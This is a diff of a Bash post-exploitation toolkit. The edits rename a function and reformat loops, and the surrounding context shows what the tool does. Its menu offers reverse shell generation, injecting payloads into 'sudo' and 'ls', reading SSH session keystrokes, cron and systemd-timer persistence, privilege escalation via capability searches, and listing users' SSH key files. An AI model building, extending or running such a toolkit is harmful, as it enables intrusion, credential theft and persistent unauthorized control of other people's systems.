@@ -128,7 +128,7 @@ lswrap(){
 	esac
 }
 
-keyinject(){
+keyread(){
 	if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_TTY" ]; then
 		echo "SSH processes:"
 		ps aux | grep sshd | awk '{ print "ID: "$2" - "$11" "$12"\n" }' | grep -v 'grep\|sbin'
@@ -197,8 +197,7 @@ systimer(){
 	"${filename}.timer"
 	)
 
-	for timer in "${!build[@]}"
-		do
+	for timer in "${!build[@]}"; do
 		echo -e ${build[timer]} > ${sysdir}${filenames[timer]}
 	done
 	systemctl daemon-reload
@@ -233,8 +232,7 @@ escalate(){
 		"getcap -r / 2>/dev/null"
 		)
 
-		for method in "${!methods[@]}"
-			do
+		for method in "${!methods[@]}"; do
 			$? 2>/dev/null
 			eval "${methods[method]}"
 			if (("$?" == 0)); then
@@ -417,8 +415,7 @@ info(){
 	"ls /home/*/.ssh/*"
 	)
 
-	for command in "${!commands[@]}"
-		do
+	for command in "${!commands[@]}"; do
 		$? 2>/dev/null
 		eval "${commands[command]}"
 		echo -e "\n\nRunning '${commands[command]}'\n"
@@ -466,8 +463,7 @@ banip(){
 }
 
 
-while true
-do
+while true; do
 clear
 options=( "Generate Reverse Shells" "Inject 'sudo' to run payload as root" "Inject 'ls' with payload" 
 "Read ssh process keystrokes" "Add cron job for persistence" "Create systemd timer for persistence" 
@@ -476,7 +472,7 @@ dispatch_table=(
 	["Generate Reverse Shells"]=genpayload
 	["Inject 'sudo' to run payload as root"]=sudowrap
 	["Inject 'ls' with payload"]=lswrap
-	["Read ssh process keystrokes"]=keyinject
+	["Read ssh process keystrokes"]=keyread
 	["Add cron job for persistence"]=cron
 	["Create systemd timer for persistence"]=systimer
 	["Escalate privileges"]=escalate
